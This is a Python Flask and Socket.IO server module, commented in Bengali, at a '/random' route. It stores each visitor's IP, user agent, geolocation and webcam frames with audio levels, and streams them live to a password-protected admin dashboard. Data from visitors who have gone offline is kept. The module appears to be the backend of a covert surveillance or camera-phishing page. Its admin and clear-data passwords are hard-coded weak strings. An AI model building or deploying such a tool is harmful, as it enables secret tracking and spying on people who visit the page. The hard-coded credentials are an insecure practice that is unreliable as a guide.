from flask import Blueprint, render_template, request, session, redirect, url_for
from flask_socketio import emit
import base64
from main import socketio

bp = Blueprint('random_route', __name__, url_prefix='/random')

ADMIN_PASSWORD = 'admin123'
CLEAR_PASSWORD = 'arif123'

# ক্লায়েন্ট ডেটা: key = IP, value = {id, ip, ua, location, frame, audio, sids, offline}
clients = {}
admin_sids = set()   # এডমিন সকেট আইডি

@bp.route('/')
def index():
    return render_template('random_index.html')

@bp.route('/admin')
def admin():
    if not session.get('admin_logged_in'):
        return redirect(url_for('random_route.admin_login'))
    return render_template('random_admin.html')

@bp.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            return redirect(url_for('random_route.admin'))
        return render_template('random_admin_login.html', error='Wrong password')
    return render_template('random_admin_login.html')

@bp.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('random_route.admin'))

# ========== Socket.IO ইভেন্ট ==========
@socketio.on('connect')
def handle_connect():
    is_admin = request.args.get('admin', 'false').lower() == 'true'
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    ua = request.headers.get('User-Agent')
    
    if not is_admin:
        # ইউজার কানেক্ট
        if ip not in clients:
            clients[ip] = {
                'id': ip,
                'ip': ip,
                'user_agent': ua,
                'location': None,
                'last_frame': None,
                'audio_level': 0,
                'sids': [request.sid],
                'offline': False
            }
        else:
            if request.sid not in clients[ip]['sids']:
                clients[ip]['sids'].append(request.sid)
            clients[ip]['offline'] = False  # লাইভ হলে অফলাইন ফ্ল্যাগ রিমুভ
        print(f"✅ User connected: {ip} (total: {len(clients)})")
    else:
        admin_sids.add(request.sid)
        print(f"🛡️ Admin connected: {request.sid}")
        # এডমিনকে বর্তমান ডেটা পাঠাও
        emit('admin_update', clients, to=request.sid)

@socketio.on('disconnect')
def handle_disconnect():
    # ইউজার ডিসকানেক্ট – কিন্তু IP ডিলিট করো না (অফলাইন ডেটা রাখতে)
    for ip, data in list(clients.items()):
        if request.sid in data['sids']:
            data['sids'].remove(request.sid)
            if not data['sids']:
                data['offline'] = True
                print(f"📴 User {ip} went offline (all sids gone)")
            break
    # এডমিন সিডি রিমুভ
    if request.sid in admin_sids:
        admin_sids.remove(request.sid)
    # এডমিনদের আপডেট পাঠাও
    if admin_sids:
        emit('admin_update', clients, to=list(admin_sids))
    print(f"📴 Disconnect, active clients: {len(clients)}")

@socketio.on('ready')
def handle_ready():
    # ইউজার পারমিশন দিলে কিছু না
    pass

@socketio.on('location_update')
def handle_location(data):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    if ip in clients:
        clients[ip]['location'] = data
        clients[ip]['offline'] = False
        if admin_sids:
            emit('admin_update', clients, to=list(admin_sids))
        print(f"📍 Location update from {ip}")

@socketio.on('video_frame')
def handle_video(data):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    if ip in clients:
        clients[ip]['last_frame'] = data.get('image')
        clients[ip]['audio_level'] = data.get('audio_volume', 0)
        clients[ip]['offline'] = False
        if admin_sids:
            emit('admin_update', clients, to=list(admin_sids))
        # লগ (প্রতি ১০ম ফ্রেমে)
        if not hasattr(handle_video, 'counter'):
            handle_video.counter = 0
        handle_video.counter += 1
        if handle_video.counter % 10 == 0:
            print(f"🎥 Video frame from {ip}, audio: {data.get('audio_volume',0)}%")

# ========== ক্লিয়ার ডেটা (শুধু এডমিন) ==========
@socketio.on('clear_data')
def handle_clear(data):
    password = data.get('password')
    if password == CLEAR_PASSWORD:
        clients.clear()
        emit('clear_all', broadcast=True)   # সব ক্লায়েন্টকে সিগন্যাল
        if admin_sids:
            emit('admin_update', clients, to=list(admin_sids))
        print("🗑️ All data cleared")
        return {'status': 'ok'}
    else:
        return {'status': 'error', 'message': 'Wrong password'}
